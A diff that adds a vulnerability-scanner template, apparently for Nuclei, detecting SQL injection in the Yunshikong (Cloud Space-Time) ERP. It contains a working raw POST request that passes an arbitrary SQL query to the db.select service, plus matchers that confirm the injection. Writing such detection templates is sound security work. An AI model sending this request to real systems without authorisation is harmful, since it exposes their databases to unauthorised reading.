@@ -1,0 +1,35 @@
+id: cloud-space-time-erp-sqli
+info:
+  name: Cloud Space-Time Social Business ERP SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Yunshikong series software is vulnerable to an SQL injection vulnerability that allows attackers to execute arbitrary SQL queries.
+  reference:
+    - http://www.ysk360.com/
+  tags: sqli, erp
+
+http:
+  - raw:
+      - |
+        POST /slogin/service?service=db.select HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        params=%7B%22sql%22%3A%22SELECT%20*%20FROM%20V%24VERSION%22%7D
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Database"
+          - "\"values\""
+        part: body
+      - type: regex
+        regex:
+          - "recordCount"
+          - "fields"
+        part: body
